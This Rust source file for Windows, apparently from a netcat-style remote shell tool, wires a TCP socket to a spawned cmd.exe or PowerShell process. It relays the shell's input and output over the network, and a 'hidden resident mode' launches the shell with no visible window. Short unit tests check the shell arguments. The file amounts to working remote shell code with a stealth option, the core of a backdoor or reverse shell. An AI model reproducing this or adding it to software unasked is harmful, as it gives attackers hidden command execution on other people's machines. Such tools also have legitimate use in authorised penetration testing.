use std::io::{self, copy, Result};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use std::{os::windows::process::CommandExt, process::Child};

use crate::control_actions::shell_program_name;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;

pub(crate) fn shell_from_stream(stream: TcpStream, shell: &str) -> Result<()> {
    let mut sock_write = stream;
    // sock_write.set_nonblocking(false)?;
    let mut sock_write_err = sock_write.try_clone()?;
    let mut sock_read = sock_write.try_clone()?;

    // Open shell
    let mut child = spawn_windows_shell(shell)?;

    let mut stdin = child
        .stdin
        .take()
        .ok_or_else(|| io::Error::other("failed to open child stdin"))?;
    let mut stdout = child
        .stdout
        .take()
        .ok_or_else(|| io::Error::other("failed to open child stdout"))?;
    let mut stderr = child
        .stderr
        .take()
        .ok_or_else(|| io::Error::other("failed to open child stderr"))?;

    // FIXME: Use async IO if possible
    let stdout_handle = thread::spawn(move || copy(&mut stdout, &mut sock_write).map(|_| ()));
    let stderr_handle = thread::spawn(move || copy(&mut stderr, &mut sock_write_err).map(|_| ()));
    let stdin_handle = thread::spawn(move || copy(&mut sock_read, &mut stdin).map(|_| ()));

    child.wait()?;
    join_copy_thread(stdout_handle)?;
    join_copy_thread(stderr_handle)?;
    join_copy_thread(stdin_handle)?;

    log::warn!("Shell exited");

    Ok(())
}

fn spawn_windows_shell(shell: &str) -> Result<Child> {
    // ------------------------------------------------------------
    // 普通模式继续保持当前 interactive shell 语义。
    // 但不同 Windows shell 的启动参数不能混用:
    // - PowerShell / pwsh 没有 `-i`,误传会被当成 `-InputFormat`
    // - cmd.exe 则更适合 `/Q` / `/D`
    // 只有显式进入隐藏常驻模式时,才给子 shell 打上无窗口标记。
    // ------------------------------------------------------------
    let mut command = Command::new(shell);
    command
        .args(interactive_shell_args(shell))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    if crate::hidden_mode::hidden_session_enabled() {
        command.creation_flags(CREATE_NO_WINDOW);
    }

    command.spawn()
}

fn interactive_shell_args(shell: &str) -> Vec<&'static str> {
    match shell_program_name(shell).as_deref() {
        Some("pwsh") | Some("pwsh.exe") | Some("powershell") | Some("powershell.exe") => {
            vec!["-NoLogo", "-NoProfile"]
        }
        Some("cmd") | Some("cmd.exe") => vec!["/Q", "/D"],
        _ => vec!["-i"],
    }
}

fn join_copy_thread(handle: thread::JoinHandle<Result<()>>) -> Result<()> {
    match handle.join() {
        Ok(result) => result,
        Err(_) => Err(io::Error::other("shell copy thread panicked")),
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn create_no_window_constant_should_match_windows_value() {
        assert_eq!(super::CREATE_NO_WINDOW, 0x0800_0000);
    }

    #[test]
    fn interactive_shell_args_should_use_powershell_friendly_flags() {
        assert_eq!(
            super::interactive_shell_args("powershell.exe"),
            vec!["-NoLogo", "-NoProfile"]
        );
        assert_eq!(
            super::interactive_shell_args("pwsh.exe"),
            vec!["-NoLogo", "-NoProfile"]
        );
    }

    #[test]
    fn interactive_shell_args_should_use_cmd_friendly_flags() {
        assert_eq!(super::interactive_shell_args("cmd.exe"), vec!["/Q", "/D"]);
    }

    #[test]
    fn interactive_shell_args_should_keep_generic_shell_fallback() {
        assert_eq!(super::interactive_shell_args("bash"), vec!["-i"]);
    }
}
